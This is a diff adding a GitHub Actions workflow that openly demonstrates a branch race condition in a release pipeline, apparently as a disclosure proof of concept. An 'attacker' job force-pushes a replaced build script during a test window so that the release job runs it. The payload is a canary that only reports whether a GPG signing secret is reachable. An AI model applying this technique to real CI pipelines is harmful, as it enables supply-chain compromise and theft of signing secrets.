@@ -1,0 +1,78 @@
+name: PoC - Branch Race Condition
+
+on:
+  workflow_dispatch:
+
+jobs:
+  # Simulates the preview workflow pushing clean code
+  simulate_legit_push:
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          ref: main
+          fetch-depth: 0
+      - name: Setup git
+        run: |
+          git config user.email "ci@test.com"
+          git config user.name "CI"
+          git remote set-url origin https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}
+      - name: Force push clean code to 5.x-preview
+        run: |
+          git checkout -B 5.x-preview
+          echo "clean build" > /tmp/status.txt
+          git push -f origin 5.x-preview
+
+  # Simulates the test window (where the race happens)
+  simulate_test_window:
+    needs: simulate_legit_push
+    runs-on: ubuntu-24.04
+    steps:
+      - name: Simulating long-running tests
+        run: sleep 30
+
+  # Attacker pushes malicious code during test window
+  attacker_push:
+    needs: simulate_legit_push
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          ref: main
+          fetch-depth: 0
+      - name: Setup git
+        run: |
+          git config user.email "attacker@test.com"
+          git config user.name "attacker"
+          git remote set-url origin https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}
+      - name: Push malicious code to 5.x-preview
+        run: |
+          git checkout -B 5.x-preview
+          # Inject canary into build script
+          mkdir -p .github/scripts
+          cat > .github/scripts/build-package.sh << 'PAYLOAD'
+          #!/bin/bash
+          echo "## RACE CONDITION PoC" >> $GITHUB_STEP_SUMMARY
+          echo "Attacker code executed in release context" >> $GITHUB_STEP_SUMMARY
+          echo "GPG secret accessible: $([[ -n "$GPG_CERTIFICATE_PASS" ]] && echo YES || echo NO)" >> $GITHUB_STEP_SUMMARY
+          PAYLOAD
+          chmod +x .github/scripts/build-package.sh
+          git add -A
+          git commit -m "Malicious payload"
+          git push -f origin 5.x-preview
+
+  # Release job picks up whatever is on 5.x-preview NOW
+  simulate_release:
+    needs: [simulate_test_window, attacker_push]
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          ref: 5.x-preview  # <-- fetches attacker's code
+      - name: Verify which code was checked out
+        run: |
+          echo "## Release Job Checkout" >> $GITHUB_STEP_SUMMARY
+          echo "build-package.sh contents:" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          cat .github/scripts/build-package.sh >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
